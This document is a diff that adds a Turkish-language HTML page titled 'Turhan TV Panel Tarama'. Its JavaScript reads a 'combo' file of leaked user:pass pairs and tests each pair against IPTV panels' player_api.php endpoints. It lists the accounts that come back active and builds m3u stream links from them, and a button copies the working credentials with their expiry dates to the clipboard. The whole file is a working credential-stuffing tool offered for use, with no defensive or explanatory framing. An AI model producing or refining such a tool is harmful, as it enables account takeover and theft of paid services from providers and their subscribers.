@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Turhan TV Panel Tarama - PC</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+    }
+    .container {
+      display: flex;
+      height: 100vh;
+    }
+    .left, .right {
+      display: flex;
+      flex-direction: column;
+      padding: 20px;
+      overflow-y: auto;
+    }
+    .left {
+      width: 30%;
+      background: #1a1a1a;
+      border-right: 1px solid #333;
+    }
+    .right {
+      width: 70%;
+      background: #000;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      background: #222;
+      color: #0f0;
+      border: 1px solid #0f0;
+      font-size: 15px;
+    }
+    label {
+      color: #00f0ff;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    h2 {
+      text-align: center;
+      color: #0ff;
+      margin-top: 0;
+    }
+    .info-log {
+      background: #000;
+      border: 1px solid #0f0;
+      color: #0f0;
+      font-size: 13px;
+      padding: 10px;
+      height: 220px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
+    #log {
+      background: #000;
+      padding: 10px;
+      overflow-y: auto;
+      font-size: 14px;
+      border: 1px solid #0f0;
+      margin-top: 10px;
+      height: 140px;
+    }
+    #resultWrapper {
+      overflow-x: auto;
+      width: 100%;
+    }
+    table {
+      width: 100%;
+      min-width: 800px;
+      color: white;
+      border-collapse: collapse;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    th, td {
+      border: 1px solid #444;
+      padding: 8px;
+      text-align: center;
+      white-space: nowrap;
+    }
+    th {
+      background: #222;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left">
+      <h2>Turhan TV Panel Tarama</h2>
+      <label>Panel URL'leri (virgülle):</label>
+      <input type="text" id="panelUrl" placeholder="http://site1, http://site2">
+      <label>Combo Dosyası (user:pass):</label>
+      <input type="file" id="comboFile" accept=".txt">
+      <button onclick="tara()">Taramayı Başlat</button>
+      <button onclick="durdur()">Durdur</button>
+      <button onclick="kopyalaM3U()">Başarılıları Kopyala</button>
+      <div class="info-log" id="m3uInfoLog"></div>
+    </div>
+    <div class="right">
+      <div id="log">[LOG] Hazır.</div>
+      <div id="resultWrapper">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>Kullanıcı</th>
+              <th>Şifre</th>
+              <th>Durum</th>
+              <th>Geçerlilik</th>
+              <th>Bağlantı</th>
+              <th>M3U</th>
+            </tr>
+          </thead>
+          <tbody id="resultTable"></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let dur = false;
+    let index = 0;
+    let combos = [];
+    let m3uEntries = [];
+
+    function log(msg) {
+      const logEl = document.getElementById("log");
+      logEl.innerHTML += `<br>${msg}`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function durdur() {
+      dur = true;
+      log("[INFO] Tarama durduruldu.");
+    }
+
+    function kopyalaM3U() {
+      const text = m3uEntries.map(e => `TURHANTVHD PANEL TARAMASI\n${e.link}\nKullanıcı: ${e.user}\nŞifre: ${e.pass}\nBağlantı Hakkı: ${e.conn}\nDurum: Aktif\nSon Tarih: ${e.expiration}\n---------------------------\n`).join("\n");
+      navigator.clipboard.writeText(text);
+      alert("Başarılı bağlantılar kopyalandı.");
+    }
+
+    async function tara() {
+      dur = false;
+      index = 0;
+      combos = [];
+      m3uEntries = [];
+      document.getElementById("resultTable").innerHTML = "";
+      document.getElementById("m3uInfoLog").innerText = "";
+
+      const panelInput = document.getElementById("panelUrl").value;
+      const panels = panelInput.split(",").map(p => p.trim()).filter(Boolean);
+
+      const file = document.getElementById("comboFile").files[0];
+      if (!file) return alert("Combo dosyası seçilmedi.");
+
+      const text = await file.text();
+      combos = text.split("\n").map(x => x.trim()).filter(Boolean);
+
+      for (const panel of panels) {
+        for (const combo of combos) {
+          if (dur) return;
+          const [user, pass] = combo.split(":");
+          if (!user || !pass) continue;
+
+          const url = `${panel}/player_api.php?username=${user}&password=${pass}`;
+          try {
+            const res = await fetch(url);
+            const json = await res.json();
+
+            if (json.user_info && json.user_info.status === "Active") {
+              const m3u = `${panel}/get.php?username=${user}&password=${pass}&type=m3u_plus&output=ts`;
+              const expiration = json.user_info.exp_date
+                ? new Date(json.user_info.exp_date * 1000).toISOString().split("T")[0]
+                : "Yok";
+              const conn = json.user_info.max_connections || "?";
+
+              m3uEntries.push({ link: m3u, user, pass, expiration, conn });
+              document.getElementById("resultTable").innerHTML += `
+                <tr>
+                  <td>${m3uEntries.length}</td>
+                  <td>${user}</td>
+                  <td>${pass}</td>
+                  <td>Aktif</td>
+                  <td>${expiration}</td>
+                  <td>${conn}</td>
+                  <td><a href="${m3u}" target="_blank">m3u</a></td>
+                </tr>`;
+
+              const logText = `TURHANTVHD PANEL TARAMASI\n${m3u}\nKullanıcı: ${user}\nŞifre: ${pass}\nBağlantı Hakkı: ${conn}\nDurum: Aktif\nSon Tarih: ${expiration}\n---------------------------\n`;
+              document.getElementById("m3uInfoLog").innerText += logText;
+
+              log(`[✓] ${user}:${pass} aktif.`);
+            } else {
+              log(`[X] ${user}:${pass} pasif.`);
+            }
+          } catch (e) {
+            log(`[!] ${user}:${pass} hatalı bağlantı.`);
+          }
+        }
+      }
+    }
+  </script>
+</body>
+</html>
